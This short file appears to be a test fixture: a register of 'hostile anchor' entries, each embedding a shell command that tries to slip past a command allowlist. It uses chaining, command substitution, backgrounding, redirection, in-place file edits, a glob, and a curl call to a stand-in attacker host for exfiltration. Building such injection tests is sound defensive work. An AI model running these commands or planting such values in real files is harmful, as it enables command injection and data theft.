# Hostile anchor content — a register is a text file anyone can write to

Chained command  [obs: `grep -c foo; touch /tmp/obs-anchor-PWNED-A` = 1]
Command substitution [obs: `grep -c $(touch /tmp/obs-anchor-PWNED-B)` = 1]
Backgrounding    [obs: `grep -c foo & touch /tmp/obs-anchor-PWNED-C` = 1]
Redirection      [obs: `grep -c foo > /tmp/obs-anchor-PWNED-D` = 1]
Non-allowlisted  [obs: `curl https://evil.example/exfil` = 1]
Writes files     [obs: `sed -i s/a/b/ hostile.md` = 1]
Unexpanded glob  [obs: `grep -c foo *.md` = 1]
